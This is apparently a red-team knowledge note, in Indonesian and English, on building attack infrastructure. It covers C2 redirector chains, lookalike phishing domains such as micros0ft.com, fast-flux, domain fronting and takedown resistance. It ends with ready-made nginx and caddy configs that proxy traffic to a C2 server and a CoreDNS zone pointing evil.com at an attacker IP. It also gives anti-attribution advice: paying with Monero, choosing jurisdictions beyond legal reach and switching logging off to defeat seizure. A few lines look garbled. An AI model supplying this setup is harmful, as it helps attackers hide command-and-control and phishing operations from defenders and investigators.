---
title: Attack Perspective — Infrastructure (Red Team)
tags:
- attack
- red-team
- infrastructure
- proxy
- redirector
- dns
- tls
- vps
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# Infrastructure — Perspektif Penyerang

> Infrastructure = lapisan yang mendukung operasi (C2, redirector, VPN, DNS). Red team: VPS/redirector setup, DNS strategy, TLS cert, email (phishing infra), takedown resistance.

## 1. Infrastructure Components

| Komponen | Fungsi | Red Team Setup | Evasion | Detection Risk |
|----------|--------|---------------|---------|----------------|
| **VPS** | C2 server, redirector | Multiple VPS (different provider) | Geo-distributed | Provider abuse report |
| **Redirector** | Proxy target → C2 | Nginx/Apache reverse proxy | Legit web server | Redirector IP → C2 discovery |
| **Domain** | C2 domain, phishing domain | Alter-nate TLD, lookalike | Legit registration | Domain reputation |
| **DNS** | C2 resolution, mail (SPF/DKIM) | Custom NS, fast-flux | Fast-flux = rotating IP | Passive DNS detect |
| **TLS Cert** | HTTPS C2, cert pinning | Let's Encrypt (free) | Valid cert = legit | Cert transparency log |
| **Email** | Phishing delivery | SMTP relay, lookalike domain | SPF/DKIM valid | Email gateway detect |
| **CDN** | Domain fronting | Cloudflare/Azure edge | CDN = legit traffic | CDN abuse report |
| **Fast-Flux** | Rotating IP → takedown resist | DNS A record rotate | IP = always changing | Flux detect = heuristics |

## 2. C2 Infrastructure Chain

```
Domain: Register c2 domain (lookalike / random TLD)
    ↓
VPS: Buy VPS (different provider, anonymous payment)
    ↓
DNS: Point domain → VPS IP (or CDN)
    ↓
Redirector:
  ├── Nginx → proxy /c2 path → C2 server
  ├── Response: legit 404 for non-C2 path
  └→ C2 hidden behind legit-looking web
    ↓
TLS: Let's Encrypt cert → HTTPS + valid cert
    ↓
Implant: Beacon → domain → redirector → C2
    ↓
Takedown Resistance:
  ├── Fast-flux: DNS rotate → multiple IP
  ├── Backup domain: second C2 domain
  ├── Geo-distributed: VPS multi-region
  └→ Re-deploy: script → new VPS → new domain
```

## 3. Email Phishing Infra

```
Domain: Lookalike domain (micros0ft.com, paypa1.com)
    ↓
Email: SMTP relay (mailgun, sendgrid — easy) atau VPS
    ↓
Auth: SPF + DKIM + DMARC (valid) → deliverability
    ↓
Template: Legit-looking (logo, signature)
    ↓
Send: Targeted (small volume) → below gateway threshold
    ↓
Landing: Redirector → credential page / malicious doc
    ↓
Evasion: SPF/DKIM valid → email gateway trust
```

## 4. Fast-Flux

```
DNS: A record → rotate IP (5-min TTL)
    ↓
Proxy Chain: Multiple compromised/proxy node → round-robin
    ↓
Result: C2 IP = selalu berubah
    ↓
Detection:
  ├── Passive DNS: history → flux pattern
  ├── Resolution: different IP per query
  └→ Mitigation: flux detect = heuristic → partial
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Nginx** | Redirector / proxy |
| **Let's Encrypt (certbot)** | TLS cert |
| **Cloudflare** | CDN front / domain fronting |
| **terraform** | infra automation (re-deploy) |
| **Docker** | C2 server container (portable) |
| **Ansible** | VPS auto-config |
| **Cobalt Strike / Sliver** | C2 server |

## 6. Referensi
- Cobalt Strike infra — https://blog.cobaltstrike.com/...
- Redirector setup — https://posts.specterops.io/...
- Fast-flux — https://en.wikipedia.org/wiki/Fast_flux
- Passive DNS — https://securitytrails.com/
- Domain fronting — https://www.bamsoftware.com/papers/fronting/

## Konkret — Infrastructure Payload (Testable)

### Redirector (Nginx reverse proxy)

```nginx
# /etc/nginx/sites-enabled/redirector.conf
server {
    listen 443 ssl;
    server_name cdn-legit.com;
    ssl_certificate /etc/letsencrypt/live/cdn-legit.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-legit.com/privkey.pem;

    location / {
        proxy_pass https://C2_SERVER:8443/;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

# Hasil: traffic target → cdn-legit.com (redirector) → C2 server real
# Target lihat TLS cert legit → tidak curiga
```

### Domain Legit (TVFive-Layer)

```bash
# 1. Beli domain aged (>= 1 tahun registered, history clean)
# 2. Kategori: tech, CDN, software company
# 3. TLS cert free (Let's Encrypt / caddy)
caddy reverse-proxy --from cdn-legit.com --to C2_IP:8443
# 4. Email server (SPF/DKIM/DMARC pass) → phishing credible
# 5. Jitter traffic: simulate normal user behavior (Chrome UA, browser finger L/R)
```

### DNS sinkhole redirect (self-hosted DNS server)

```bash
# CoreDNS config (custom zone + attacker domain)
# zone evil.com → A record ke attacker IP
# any query *.evil.com → 1 record [attack IP]
cat > Corefile <<EOF
evil.com:53 {
    file /etc/coredns/zones/evil.com.zone
}
EOF

# nslookup verify
nslookup test.evil.com localhost
# attacker IP siap menerima C2 traffic
```

### VPS Setup (Anti-Attribution)

```bash
# Prolexic attack: go Infra on Crypto VPS provider (pay via Monero)
# Jurisdiction: pilih yang tidak MLA dengan target country
# No KYC: offshore / VPN provider via Monero
# Ket :

# 1. Rent VPS X (Monero)
# 2. Setup redirector (CF / openresty) → dom senjata
# 3. C2 server (Cobalt Strike / Sliver) di VPS Y
# 4. DNS at auth NS provider (freeDNS removed / bareDNS )
# 5. Logging OFF di semua server (no trace jika seized)
```
---

audited
---
